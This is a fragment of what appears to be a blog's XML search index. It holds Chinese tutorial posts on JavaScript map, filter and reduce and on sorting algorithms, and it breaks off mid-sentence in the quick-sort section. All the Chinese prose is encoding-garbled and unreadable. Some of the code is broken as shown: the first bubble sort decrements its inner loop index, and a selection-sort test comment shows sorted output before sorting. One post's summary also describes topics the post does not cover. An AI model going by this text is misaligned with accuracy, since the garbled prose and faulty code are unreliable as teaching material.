JavaScriptå‡½æ•°å¼å·¥å…·ç®±â€”â€”mapã€filter å’Œ reducemapã€filterå’Œreduceå‡½æ•°æ˜¯å‡½æ•°å¼ç¼–ç¨‹çš„åŸºç¡€ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨mapå‡½æ•° ï¼ŒæŠŠä¸€ä¸ªæ•°æ®é›†åˆè½¬æ¢æˆæ˜ å°„æˆå¦ä¸€ä¸ªæ•°æ®é›†åˆã€‚å…ˆçœ‹ä¸€ä¸ªå‘½ä»¤å¼ç¼–ç¨‹çš„ä¾‹å­ï¼š 123456789var daysOfWeek = [ &#123; name: 'Monday', value: 1 &#125;, &#123; name: 'Tuseday', value: 2 &#125;, &#123; name: 'Webnesday', value: 7 &#125;,]var daysOfWeekValues_ = [];for(var i = 0; i &lt; daysOfWeek.length; i++ )&#123; daysOfWeekValues_.push(daysOfWeek[i].value);&#125; å†ä»¥å‡½æ•°å¼ç¼–ç¨‹æ¥è€ƒè™‘åŒæ ·çš„ä¾‹å­ï¼Œä»£ç å¦‚ä¸‹ï¼š 1234var daysOfWeekValues = daysOfWeek.map(function(day)&#123; return day.value;&#125;)console.log(daysOfWeekValues); æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ filter å‡½æ•°è¿‡æ»¤ä¸€ä¸ªé›†åˆçš„å€¼ã€‚æ¥çœ‹ä¸€ä¸ªä¾‹å­ 12345678910var positiveNumbers_ = function(array)&#123; var positive = []; for(var i = 0; i &lt; array.length; i++)&#123; if(array[i] &gt;= 0)&#123; positive.push(array[i]); &#125; &#125; return positive;&#125;console.log(positiveNumbers_([-1,1,2,-2])); // (2) [1, 2] æ”¹æˆå‡½æ•°å¼ 123456var positiveNumbers = function(array)&#123; return array.filter(function(num)&#123; return num &gt;= 0; &#125;);&#125;console.log(positiveNumbers([-1,1,2,-2])); // (2) [1, 2] ä¹Ÿå¯ä»¥ä½¿ç”¨reduceå‡½æ•°ï¼ŒæŠŠä¸€ä¸ªé›†åˆå½’çº³æˆä¸€ä¸ªçº¦å®šçš„å€¼ã€‚æ¯”å¦‚ï¼Œå¯¹ä¸€ä¸ªæ•°ç»„ä¸­çš„å€¼æ±‚å’Œï¼š 12345678var sumValues = function(array)&#123; var total = array[0]; for(var i = 1; i &lt; array.length; i++)&#123; total += array[i]; &#125; return total;&#125;console.log(sumValues([1,2,3,4,5])); // 15 ä¸Šé¢çš„ä»£ç ä¹Ÿå¯ä»¥å†™æˆè¿™æ ·çš„ï¼š 123456var sum_ = function(array)&#123; return array.reduce(function(a,b)&#123; return a + b; &#125;);&#125;console.log(sum_([1,2,3,4,5])); // 15 å†çœ‹å¦å¤–ä¸€ä¸ªä¾‹å­ï¼Œè€ƒè™‘æˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªå‡½æ•°ï¼ŒæŠŠå‡ ä¸ªæ•°ç»„è¿žæŽ¥èµ·æ¥ã€‚ä¸ºæ­¤ï¼Œå¯ä»¥åˆ›å»ºå¦å¤–ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºŽå­˜æ”¾å…¶ä»–æ•°ç»„çš„å…ƒç´ ã€‚æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¼çš„ä»£ç  123456789101112var mergeArrays = function(arrays)&#123; var count = arrays.length, newArray = [], k = 0; for(var i = 0; i &lt; count; i++)&#123; for(var j = 0; j &lt; arrays[i].length; j++)&#123; newArray[k++] = arrays[i][j]; &#125; &#125; return newArray;&#125;console.log(mergeArrays([[1,2,3],[4,5],[6]])); // (6) [1, 2, 3, 4, 5, 6] åœ¨è¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å£°æ˜Žäº†å˜é‡ï¼Œè¿˜ä½¿ç”¨äº†å¾ªçŽ¯ã€‚çŽ°åœ¨ï¼Œæˆ‘ä»¬ç”¨JavaScript å‡½æ•°å¼ç¼–ç¨‹æŠŠä¸Šé¢çš„ä»£ç é‡å†™å¦‚ä¸‹ï¼š 123456var mergeArraysConcat = function(arrays)&#123; return arrays.reduce(function(p,n)&#123; return p.concat(n); &#125;);&#125;console.log(mergeArraysConcat([[1,2,3],[4,5],[6]])); // (6) [1, 2, 3, 4, 5, 6] ç®­å¤´å‡½æ•°ç®€å†™ 12const mergeArrays = (...arrays) =&gt; [].concat(...arrays);console.log(mergeArrays([1,2,3],[4,5],[6])); // (6) [1, 2, 3, 4, 5, 6] å°ç»“åœ¨æœ¬ç« ä¸­ï¼Œä½ äº†è§£äº†æ›´å¤šçš„é€’å½’çš„çŸ¥è¯†ï¼Œå·²ç»å®ƒå¸®åŠ©æˆ‘ä»¬è§£å†³ä¸€äº›åŠ¨æ€è§„åˆ’é—®é¢˜ã€‚æˆ‘ä»¬ä»‹ç»äº†æœ€è‘—åçš„åŠ¨æ€è§„åˆ’é—®é¢˜ï¼Œå¦‚æœ€å°‘ç¡¬å¸æ‰¾é›¶ã€èƒŒåŒ…é—®é¢˜ã€æœ€é•¿å…¬å…±å­åºåˆ—å’ŒçŸ©é˜µé“¾ç›¸ä¹˜(åŽé¢è¡¥)ã€‚ è¿˜å­¦ä¹ äº†è´ªå¿ƒç®—æ³•ï¼Œå·²ç»å¦‚ä½•ç”¨è´ªå¿ƒç®—æ³•è§£å†³æœ€å°‘ç¡¬å¸æ‰¾é›¶å’ŒèƒŒåŒ…é—®é¢˜ã€‚ è¿˜å­¦ä¹ äº†å‡½æ•°å¼ç¼–ç¨‹ï¼Œå¹¶é€šè¿‡ä¸€äº›ä¾‹å­äº†è§£äº†å¦‚ä½•ä»¥è¿™ç§èŒƒå¼ä½¿ç”¨JavaScript çš„åŠŸèƒ½ã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬åç« ï¼‰â€”â€” æŽ’åºå’Œæœç´¢ç®—æ³•]]></title>
    <url>%2F2018-11-07-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part10.html</url>
    <content type="text"><![CDATA[æœ¬ç« å°†ä¼šå­¦ä¹ æœ€å¸¸è§çš„æŽ’åºå’Œæœç´¢ç®—æ³•ï¼Œå¦‚å†’æ³¡æŽ’åºã€é€‰æ‹©æŽ’åºã€æ’å…¥æŽ’åºã€å½’å¹¶æŽ’åºã€å¿«é€ŸæŽ’åºå’Œå †æŽ’åºï¼Œä»¥åŠé¡ºåºæŽ’åºå’ŒäºŒå‰æœç´¢ç®—æ³•ã€‚ ç¬¬åç«  æŽ’åºå’Œæœç´¢ç®—æ³•æŽ’åºç®—æ³•æˆ‘ä»¬ä¼šä»Žä¸€ä¸ªæœ€æ…¢çš„å¼€å§‹ï¼ŒæŽ¥ç€æ˜¯ä¸€äº›æ€§èƒ½å¥½ä¸€äº›çš„æ–¹æ³• å…ˆåˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼ˆåˆ—è¡¨ï¼‰æ¥è¡¨ç¤ºå¾…æŽ’åºå’Œæœç´¢çš„æ•°æ®ç»“æž„ã€‚ 123456789function ArrayList()&#123; var array = []; this.insert = function(item)&#123; array.push(item); &#125; this.toString = function()&#123; return array.join(); &#125;&#125; ArrayList æ˜¯ä¸€ä¸ªç®€å•çš„æ•°æ®ç»“æž„ï¼Œå®ƒå°†é¡¹å­˜å‚¨åœ¨æ•°ç»„ã€‚æˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªæ’å…¥æ–¹æ³•æ¥å‘æ•°æ®ç»“æž„ä¸­æ·»åŠ å…ƒç´ ã€‚ä½¿ç”¨jsåŽŸç”Ÿçš„pushæ–¹æ³•å³å¯ï¼Œè€Œæ”¹å†™toStringå‡½æ•°è¿ç”¨äº†jsçš„joinæ–¹æ³•æ˜¯æ¥æ‹¼æŽ¥æ•°ç»„ä¸­çš„æ‰€æœ‰å…ƒç´ è‡³ä¸€ä¸ªå•ä¸€çš„å­—ç¬¦ä¸²ã€‚ å†’æ³¡æŽ’åºå†’æ³¡æŽ’åºæ˜¯æ‰€æœ‰æŽ’åºç®—æ³•ä¸­æœ€ç®€å•ï¼Œç„¶åŽä»Žè¿è¡Œæ—¶é—´çœ‹ï¼Œå®ƒä¹Ÿæ˜¯æœ€å·®çš„ä¸€ä¸ªã€ å†’æ³¡æŽ’åºæ¯”è¾ƒä¸¤ä¸ªç›¸é‚»çš„é¡¹ï¼Œå¦‚æžœç¬¬ä¸€ä¸ªå¤§äºŽç¬¬äºŒä¸ªï¼Œåˆ™äº¤æ¢å®ƒä»¬ã€‚å…ƒç´ é¡¹å‘ä¸Šç§»åŠ¨è‡³æ­£ç¡®çš„é¡ºåºï¼Œå°±å¥½åƒæ°”æ³¡å‡è‡³è¡¨é¢ä¸€æ ·ï¼Œå†’æ³¡æŽ’åºå› æ­¤å¾—åã€‚ 1234567891011// å†’æ³¡æŽ’åºthis.bubbleSort = function()&#123; var length = array.length; for(var i = 0; i &lt;length; i++)&#123; for(var j = 0; j &lt; length -1; j--)&#123; if(array[j] &gt; array[j+1])&#123; this.swap(j,j+1); &#125; &#125; &#125;&#125; é¦–å…ˆï¼Œå£°æ˜Žä¸€ä¸ª åä¸ºlengthçš„å˜é‡ï¼Œç”¨æ¥å­˜å‚¨æ•°ç»„çš„é•¿åº¦ã€‚æŽ¥ç€å¤–å¾ªçŽ¯ä»Žæ•°ç»„çš„ç¬¬ä¸€ä½è¿­ä»£åˆ°æœ€åŽä¸€ä½ï¼Œå®ƒæŽ§åˆ¶äº†åœ¨æ•°ç»„ä¸­ç»è¿‡å¤šæ¬¡è½®æŽ’åºï¼Œç„¶åŽå†…å¾ªçŽ¯å°†ä»Žç¬¬ä¸€ä½è¿­ä»£åˆ°å€’æ•°ç¬¬äºŒä½ï¼Œå†…å¾ªçŽ¯å®žé™…ä¸Šè¿›è¡Œå½“å‰é¡¹å’Œä¸‹ä¸€é¡¹çš„æ¯”è¾ƒã€‚å¦‚æžœè¿™ä¸¤é¡¹é¡ºåºä¸å¯¹ï¼Œåˆ™äº¤æ¢å®ƒä»¬ï¼Œæ„æ€å°±æ˜¯ä½ç½®ä¸º j+1 çš„ä¼šè¢«æ¢åˆ°ä½ç½® j å¤„ã€‚ å£°æ˜Ž swapå‡½æ•° 123456this.swap = function(index1,index2)&#123; var aux = array[index1]; array[index1] = array[index2]; array[index2] = aux;// [array[index1],array[index2]] = [array[index2],array[index1]]&#125; äº¤æ¢æ—¶ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ªä¸­é—´å€¼æ¥å­˜å‚¨æŸä¸€äº¤æ¢é¡¹çš„å€¼ã€‚å…¶ä»–æŽ’åºæ³•ä¹Ÿä¼šç”¨åˆ°è¿™ä¸ªæ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬å£°æ˜Žä¸€ä¸ªæ–¹æ³•æ”¾ç½®è¿™æ®µäº¤æ¢ä»£ç ä»¥ä¾¿é‡ç”¨ã€‚ è¿˜å¯ä»¥ç®€åŒ–æˆ 1[array[index1],array[index2]] = [array[index2],array[index1]] ä¸‹é¢è¿™ä¸ªç¤ºæ„å›¾å±•ç¤ºäº†å†’æ³¡æŽ’åºçš„å·¥ä½œè¿‡ç¨‹ ä¸Šé¢çš„å›¾æ¯ä¸€å°æ®µè¡¨ç¤ºå¤–å¾ªçŽ¯çš„ä¸€è½®ï¼Œè€Œç›¸é‚»ä¸¤é¡¹çš„æ¯”è¾ƒæ˜¯åœ¨å†…å¾ªçŽ¯ä¸­è¿›è¡Œçš„ã€‚ ç”¨ä¸‹é¢çš„ä»£ç æ¥æµ‹è¯•å†’æ³¡æŽ’åºç®—æ³• 123456789101112function createNonSortedArray(size)&#123; var array = new ArrayList(); for(var i = size; i &gt; 0; i--)&#123; array.insert(i); &#125; return array;&#125;var array = createNonSortedArray(5);console.log(array.toString()); // 5,4,3,2,1array.bubbleSort();console.log(array.toString()); // 1,2,3,4,5 ä¸ºäº†è¾…åŠ©æœ¬ç« å°†è¦å­¦ä¹ çš„æŽ’åºç®—æ³•ï¼Œæˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªå‡½æ•°æ¥è‡ªåŠ¨åœ°åˆ›å»ºä¸€ä¸ªæœªæŽ’åºçš„æ•°ç»„ï¼Œæ•°ç»„çš„é•¿åº¦ç”±å‡½æ•°çš„å‚æ•°æŒ‡å®šã€‚å¦‚æžœä¼ é€’5ä¸ºå‚æ•°ï¼Œè¯¥å‡½æ•°å°±ä¼šåˆ›å»ºå¦‚ä¸‹æ•°ç»„ [5,4,3,2,1] è°ƒç”¨è¿™ä¸ªå‡½æ•°å¹¶å°†è¿”å›žå€¼å­˜å‚¨åœ¨ä¸€ä¸ªå˜é‡ä¸­ï¼Œè¯¥å˜é‡å°†åŒ…å«è¿™ä¸ªä»¥æŸäº›æ•°å­—æ¥åˆå§‹åŒ–çš„ ArrayList ç±»å®žä¾‹ã€‚ æ³¨æ„å½“ç®—æ³•æ‰§è¡Œå¤–å¾ªçŽ¯çš„ç¬¬äºŒè½®çš„æ—¶å€™ï¼Œæ•°å­—4å’Œ5å·²ç»æ˜¯æ­£ç¡®æŽ’åºçš„äº†ã€‚ä½†æ˜¯åœ¨åŽç»­çš„æ¯”è¾ƒä¸­ï¼Œå®ƒä»¬è¿˜æ˜¯åœ¨ä¸€ç›´è¿›è¡Œç€æ¯”è¾ƒï¼Œå³ä½¿è¿™æ˜¯ä¸å¿…è¦çš„ã€‚å› æ­¤æˆ‘ä»¬ç¨å¾®æ”¹è¿›ä¸€ä¸‹ã€‚ æ”¹è¿›ç‰ˆå†’æ³¡æŽ’åº 1234567891011// æ”¹è¿›åŽçš„å†’æ³¡æŽ’åºthis.modifiedBubbleSort = function()&#123; var length = array.length; for(var i = 0; i &lt;length; i++)&#123; for(var j = 0; j &lt; length-1-i; j++)&#123; if(array[j] &gt; array[j+1])&#123; this.swap(j,j+1); &#125; &#125; &#125;&#125; ä¸‹å›¾å±•ç¤ºäº†æ”¹è¿›åŽçš„å†’æ³¡æŽ’åºç®—æ³•æ˜¯å¦‚ä½•æ‰§è¡Œçš„ï¼š å¯ä»¥é€šè¿‡æ£€éªŒçŸ¥é“å‡å°‘äº†10æ¬¡å¾ªçŽ¯ï¼Œä¼˜åŒ–äº†ç®—æ³•çš„æ€§èƒ½ã€‚ å³ä½¿åšäº†è¿™æ ·å­çš„æ”¹å˜ï¼Œè¿˜æ˜¯ä¸æŽ¨èè¯¥ç®—æ³•ï¼Œè¯¥ç®—æ³•çš„å¤æ‚åº¦æ˜¯O(n2 ) åŽé¢çš„ç« èŠ‚ä¼šä»‹ç»å¤§Oè¡¨è¾¾æ³•ã€‚ é€‰æ‹©æŽ’åºé€‰æ‹©æŽ’åºç®—æ³•æ˜¯ä¸€ç§åŽŸå€æ¯”è¾ƒæŽ’åºç®—æ³•ã€‚é€‰æ‹©æŽ’åºå¤§è‡´çš„æ€è·¯æ˜¯æ‰¾åˆ°æ•°æ®ç»“æž„ä¸­æœ€å°å€¼å¹¶å°†å…¶æ”¾ç½®åœ¨ç¬¬ä¸€ä½ï¼ŒæŽ¥ç€æ‰¾åˆ°ç¬¬äºŒå°çš„å€¼å¹¶å°†å…¶æ”¾åœ¨ç¬¬äºŒä½ã€‚ä»¥æ­¤ç±»æŽ¨ã€‚ å®žçŽ°ï¼š 12345678910111213141516// é€‰æ‹©æŽ’åºthis.selectionSort = function()&#123; var length = array.length, indexMin; for(var i = 0; i &lt; length; i++)&#123; indexMin = i; for(var j = i; j &lt; length; j++)&#123; if(array[indexMin] &gt; array[j])&#123; indexMin = j; &#125; &#125; if(i !== indexMin)&#123; this.swap(i,indexMin); &#125; &#125;&#125; é¦–å…ˆå£°æ˜Žä¸€äº›å°†åœ¨ç®—æ³•å†…ä½¿ç”¨çš„å˜é‡ã€‚æŽ¥ç€ï¼Œå¤–å¾ªçŽ¯è¿­ä»£æ•°ç»„ï¼Œå¹¶æŽ§åˆ¶è¿­ä»£ä¸€æ¬¡ï¼ˆæ•°ç»„çš„ç¬¬nä¸ªå€¼â€”â€”ä¸‹ä¸€ä¸ªæœ€å°å€¼ï¼‰ã€‚æˆ‘ä»¬å‡è®¾æœ¬è¿­ä»£ä¸€æ¬¡çš„ç¬¬ä¸€ä¸ªå€¼ä¸ºæ•°ç»„çš„æœ€å°å€¼ã€‚ç„¶åŽï¼Œå½“å‰ i çš„å€¼å¼€å§‹è‡³æ•°ç»„ç»“æŸï¼Œæˆ‘ä»¬æ¯”è¾ƒæ˜¯å¦ä½ç½® jçš„å€¼æ¯”å½“å‰çš„æœ€å°å€¼å°ã€‚å¦‚æžœæ˜¯åˆ™æ”¹å˜æœ€å°å€¼ä¸ºæ–°çš„æœ€å°å€¼ã€‚å½“å†…å¾ªçŽ¯ç»“æŸï¼Œå°†å¾—å‡ºæ•°ç»„çš„ç¬¬nå°çš„å€¼ã€‚æœ€åŽï¼Œå¦‚æžœè¯¥æœ€å°å€¼å’ŒåŽŸæœ€å°å€¼ä¸ä¸€æ ·ï¼Œåˆ™äº¤äº’å…¶å€¼ã€‚ æµ‹è¯•ï¼š 1234var array = createNonSortedArray(5);console.log(array.toString()); // 1,2,3,4,5array.selectionSort();console.log(array.toString()); // 1,2,3,4,5 ä¸‹å›¾çš„ç¤ºæ„å›¾å±•ç¤ºäº†é€‰æ‹©æŽ’åºç®—æ³•ï¼Œæ­¤ä¾‹åŸºäºŽä¹‹å‰çš„ä»£ç ä¸­æ‰€ç”¨çš„æ•°ç»„ã€‚ æ•°ç»„åº•éƒ¨çš„ç®­å¤´æŒ‡ç¤ºå‡ºäº†å½“å‰è¿­ä»£å¯»æ‰¾æœ€å°å€¼çš„æ•°ç»„èŒƒå›´ï¼Œç¤ºæ„å›¾ä¸­çš„æ¯ä¸€æ­¥åˆ™è¡¨ç¤ºå¤–éƒ¨å¾ªçŽ¯ã€‚ é€‰æ‹©æŽ’åºåŒæ ·æ˜¯ä¸€ä¸ªå¤æ‚åº¦ä¹Ÿæ˜¯ O(n2)çš„ç®—æ³•ã€‚å’Œå†’æ³¡æŽ’åºä¸€æ ·ï¼Œå®ƒåŒ…å«æœ‰åµŒå¥—çš„ä¸¤ä¸ªå¾ªçŽ¯ï¼Œè¿™å¯¼è‡´äº†äºŒæ¬¡æ–¹çš„å¤æ‚åº¦ã€‚ç„¶åŽï¼ŒæŽ¥ä¸‹æ¥è¦å­¦çš„æ’å…¥æŽ’åºæ¯”é€‰æ‹©æŽ’åºçš„æ€§èƒ½è¦å¥½ã€‚ æ’å…¥æŽ’åºæ’å…¥æŽ’åºæ¯æ¬¡æŽ’ä¸€ä¸ªæ•°ç»„é¡¹ï¼Œä»¥æ­¤æ–¹å¼æž„å»ºæœ€åŽçš„æŽ’åºæ•°ç»„ã€‚å‡è®¾ç¬¬ä¸€é¡¹å·²ç»æŽ’åºï¼ŒæŽ¥ç€ï¼Œå®ƒå’Œç¬¬äºŒé¡¹è¿›è¡Œæ¯”è¾ƒï¼Œç¬¬äºŒé¡¹æ˜¯åº”è¯¥å¾…åœ¨åŽŸä½è¿˜æ˜¯æ’å…¥åˆ°ç¬¬ä¸€é¡¹ä¹‹å‰å‘¢ï¼Ÿè¿™æ ·ï¼Œå¤´ä¸¤é¡¹å°±å·²ç»æ­£ç¡®æŽ’åºï¼ŒæŽ¥ç€å’Œç¬¬ä¸‰é¡¹æ¯”è¾ƒï¼ˆå®ƒæ˜¯è¯¥æ’å…¥åˆ°ç¬¬ä¸€ã€ç¬¬äºŒè¿˜æ˜¯ç¬¬ä¸‰çš„ä½ç½®å‘¢ï¼Ÿï¼‰ï¼Œä»¥æ­¤ç±»æŽ¨ å®žçŽ°ï¼š 123456789101112131415// æ’å…¥æŽ’åºthis.insertionSort = function()&#123; var length = array.length, j, temp; for(var i = 0; i &lt;length; i++)&#123; j = i; temp = array[i]; while(j &gt; 0 &amp;&amp; array[j - 1] &gt; temp)&#123; array[j] = array[j - 1] j--; &#125; array[j] = temp; &#125;&#125; å…ˆå£°æ˜Žä»£ç ä¸­ä½¿ç”¨çš„å˜é‡ï¼ŒæŽ¥ç€ï¼Œè¿­ä»£æ•°ç»„æ¥ç»™ç¬¬ié¡¹æ‰¾åˆ°æ­£ç¡®çš„ä½ç½®ã€‚æ³¨æ„ï¼Œç®—æ³•æ˜¯ä»Žç¬¬äºŒä¸ªä½ç½®è€Œä¸æ˜¯ä»Ž0ä½ç½®å¼€å§‹çš„ã€‚ç„¶åŽç”¨iå€¼æ¥åˆå§‹åŒ–ä¸€ä¸ªè¾…åŠ©å˜é‡å¹¶å°†å…¶ä¿å­˜äºŽä¸€ä¸´æ—¶å˜é‡ä¸­ï¼Œä¾¿äºŽä¹‹åŽå°†å…¶æ’å…¥åˆ°æ­£ç¡®çš„ä½ç½®ä¸Šã€‚ä¸‹ä¸€æ­¥æ˜¯æ‰¾åˆ°æ­£ç¡®çš„ä½ç½®æ¥æ’å…¥é¡¹ç›®ã€‚åªè¦å˜é‡jæ¯”0å¤§å¹¶ä¸”æ•°ç»„ä¸­å‰é¢çš„å€¼æ¯”å¾…æ¯”è¾ƒçš„å€¼å¤§ï¼Œæˆ‘ä»¬å°±æŠŠè¿™ä¸ªå€¼ç§»åˆ°å½“å‰ä½ç½®ä¸Šå¹¶å‡å°jã€‚æœ€ç»ˆï¼Œè¯¥é¡¹ç›®èƒ½æ’å…¥åˆ°æ­£ç¡®çš„ä½ç½®ä¸Šã€‚ ä¸‹é¢çš„ç¤ºæ„å›¾å±•ç¤ºäº†ä¸€ä¸ªæ’å…¥æŽ’åºçš„å®žä¾‹ï¼š æŽ’åºå°åž‹æ•°ç»„æ—¶ï¼Œæ­¤ç®—æ³•æ¯”é€‰æ‹©æŽ’åºå’Œå†’æ³¡æŽ’åºæ€§èƒ½éƒ½è¦å¥½ã€‚ å½’å¹¶æŽ’åºå½’å¹¶æŽ’åºæ˜¯ç¬¬ä¸€ä¸ªå¯ä»¥è¢«å®žé™…ä½¿ç”¨çš„æŽ’åºç®—æ³•ã€‚å½’å¹¶æŽ’åºæ€§èƒ½å¤æ‚åº¦ä¸º O(nlog(n)) å½’å¹¶ç®—æ³•æ˜¯ä¸€ç§åˆ†æ²»ç®—æ³•ã€‚å…¶æ€æƒ³æ˜¯å°†åŽŸå§‹æ•°ç»„åˆ‡æˆè¾ƒå°çš„æ•°ç»„ï¼Œç›´åˆ°æ¯ä¸ªå°æ•°ç»„åªæœ‰ä¸€ä¸ªä½ç½®ï¼ŒæŽ¥ç€å°†å°æ•°ç»„å½’å¹¶æˆè¾ƒå¤§çš„æ•°ç»„ï¼Œç›´åˆ°æœ€åŽä¸€ä¸ªæŽ’åºå®Œæ¯•çš„å¤§æ•°ç»„ã€‚ ç”±äºŽæ˜¯åˆ†æ²»æ³•ï¼Œå½’å¹¶æŽ’åºä¹Ÿæ˜¯é€’å½’çš„ã€‚ 1234// å½’å¹¶æŽ’åºthis.mergeSort = function()&#123; array = this.mergeSortRec(array);&#125; mergeSortRec æ˜¯é€’å½’å‡½æ•° 12345678910this.mergeSortRec = function(array)&#123; var length = array.length; if(length === 1)&#123; return array; &#125; var mid = Math.floor(length/2), left = array.slice(0,mid), right = array.slice(mid,length); return merge(arguments.callee(left),arguments.callee(right));&#125; å½’å¹¶æŽ’åºå°†ä¸€ä¸ªå¤§æ•°ç»„è½¬åŒ–ä¸ºä¸€ä¸ªå°æ•°ç»„ç›´åˆ°åªæœ‰ä¸€ä¸ªé¡¹ã€‚ç”±äºŽç®—æ³•æ˜¯é€’å½’çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœæ­¢æ¡ä»¶ï¼Œåœ¨è¿™é‡Œæ¡ä»¶æ˜¯åˆ¤æ–­æ•°ç»„çš„é•¿åº¦æ˜¯å¦ä¸º1.å¦‚æžœæ˜¯ï¼Œåˆ™ç›´æŽ¥è¿”å›žè¿™ä¸ªé•¿åº¦ä¸º1çš„æ•°ç»„ï¼Œå› ä¸ºå®ƒå·²ç»æŽ’åºäº†ã€‚ å¦‚æžœæ•°ç»„é•¿åº¦æ¯”1å¤§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—å°†å…¶åˆ†æˆå°æ•°ç»„ã€‚ä¸ºæ­¤ï¼Œé¦–å…ˆè¦æ‰¾åˆ°æ•°ç»„çš„ä¸­é—´è¡Œï¼Œæ‰¾åˆ°åŽæˆ‘ä»¬å°†æ•°ç»„åˆ†æˆä¸¤ä¸ªå°æ•°ç»„ï¼Œåˆ†åˆ«å«åšleft å’Œ right ã€‚ left æ•°ç»„ç”±ç´¢å¼•0è‡³ä¸­é—´ç´¢å¼•çš„å…ƒç´ ç»„æˆï¼Œè€Œ right æ•°ç»„ç”±ä¸­é—´ç´¢å¼•è‡³åŽŸå§‹æ•°ç»„æœ€åŽä¸€ä¸ªä½ç½®çš„å…ƒç´ ç»„æˆã€‚ ä¸‹é¢çš„æ­¥éª¤å°±æ˜¯è°ƒç”¨merge å‡½æ•°ï¼Œå®ƒè´Ÿè´£åˆå¹¶å’ŒæŽ’åºå°æ•°ç»„æ¥äº§ç”Ÿå¤§æ•°ç»„ï¼Œç›´åˆ°å›žåˆ°åŽŸå§‹æ•°ç»„å·²æŽ’åºå®Œæˆã€‚ä¸ºäº†ä¸æ–­å°†åŽŸå§‹æ•°ç»„åˆ†æˆå°æ•°ç»„ï¼Œæˆ‘ä»¬å¾—å†æ¬¡å¯¹left æ•°ç»„å’Œright æ•°ç»„é€’å½’è°ƒç”¨ mergeSortRec ï¼Œå¹¶åŒæ—¶ä½œä¸ºå‚æ•°ä¼ é€’ç»™ merge å‡½æ•° 12345678910111213141516171819function merge(left,right)&#123; var result = [], il = 0, ir = 0; while(il &lt; left.length &amp;&amp; ir &lt; right.length)&#123; if(left[il] &lt; right[ir])&#123; result.push(left[il++]); &#125;else&#123; result.push(right[ir++]); &#125; &#125; while(il &lt; left.length)&#123; result.push(left[il++]); &#125; while(ir &lt; right.length)&#123; result.push(right[ir++]); &#125; return result; &#125; merge å‡½æ•°æŽ¥å—ä¸¤ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œå¹¶å°†å®ƒä»¬å½’å¹¶è‡³ä¸€ä¸ªå¤§æ•°ç»„ã€‚æŽ’åºå‘ç”Ÿåœ¨å½’å¹¶è¿‡ç¨‹ä¸­ã€‚é¦–å…ˆï¼Œéœ€è¦å£°æ˜Žå½’å¹¶è¿‡ç¨‹è¦åˆ›å»ºçš„æ–°æ•°ç»„å·²ç»ç”¨æ¥è¿­ä»£ä¸¤ä¸ªæ•°ç»„ï¼ˆleftå’Œrightæ•°ç»„ï¼‰æ‰€éœ€è¦çš„ä¸¤ä¸ªå˜é‡ã€‚è¿­ä»£ä¸¤ä¸ªæ•°ç»„çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ¥è‡ªleft æ•°ç»„çš„é¡¹æ˜¯å¦æ¯”æ¥è‡ªrightçš„æ•°ç»„çš„é¡¹å°ã€‚å¦‚æžœæ˜¯ï¼Œå°†è¯¥é¡¹ä»Žleftæ•°ç»„æ·»åŠ è‡³å½’å¹¶ç»“æžœæ•°ç»„ï¼Œå¹¶é€’å¢žè¿­ä»£æ•°ç»„çš„æŽ§åˆ¶å˜é‡ï¼›å¦åˆ™ï¼Œä»Žrightæ•°ç»„æ·»åŠ é¡¹å¹¶é€’å¢žç›¸åº”çš„è¿­ä»£æ•°ç»„çš„æŽ§åˆ¶å˜é‡ã€‚ æŽ¥ä¸‹æ¥ï¼Œå°†leftæ•°ç»„æˆ–rightæ•°ç»„æ‰€æœ‰å‰©ä¸‹çš„é¡¹æ·»åŠ åˆ°å½’å¹¶æ•°ç»„ä¸­ã€‚æœ€åŽï¼Œå°†å½’å¹¶æ•°ç»„ä½œä¸ºç»“æžœè¿”å›žã€‚ ä¸‹å›¾æ˜¯å…·ä½“çš„æ‰§è¡Œè¿‡ç¨‹ å¯ä»¥çœ‹åˆ°ï¼Œç®—æ³•é¦–å…ˆå°†åŽŸå§‹æ•°ç»„åˆ†å‰²æˆåªæœ‰ä¸€ä¸ªå…ƒç´ çš„å­æ•°ç»„ï¼Œç„¶åŽå¼€å§‹æŽ’åºã€‚å½’å¹¶è¿‡ç¨‹ä¹Ÿä¼šå®ŒæˆæŽ’åºï¼ŒçŸ¥é“åŽŸå§‹æ•°ç»„å®Œå…¨åˆå¹¶å¹¶å®ŒæˆæŽ’åºã€‚ å¿«é€ŸæŽ’åºå¿«é€ŸæŽ’åºä¹Ÿè®¸æ˜¯æœ€å¸¸ç”¨çš„æŽ’åºç®—æ³•äº†ã€‚å®ƒçš„å¤æ‚åº¦ä¸ºO(nlogn)ï¼Œä¸”å®ƒçš„æ€§èƒ½é€šå¸¸æ¯”å…¶ä»–çš„å¤æ‚åº¦ä¸ºO(nlog(n))çš„æŽ’åºç®—æ³•è¦å¥½ã€‚å’Œå½’å¹¶ç®—æ³•ä¸€æ ·ï¼Œå¿«é€ŸæŽ’åºä¹Ÿæ˜¯ç”¨åˆ†æ²» çš„æ–¹æ³•ï¼Œå°†åŽŸå§‹ç®—æ³•åˆ†æˆäº†è¾ƒå°çš„æ•°ç»„ï¼ˆä½†å®ƒæ²¡æœ‰åƒå½’å¹¶æŽ’åºé‚£æ 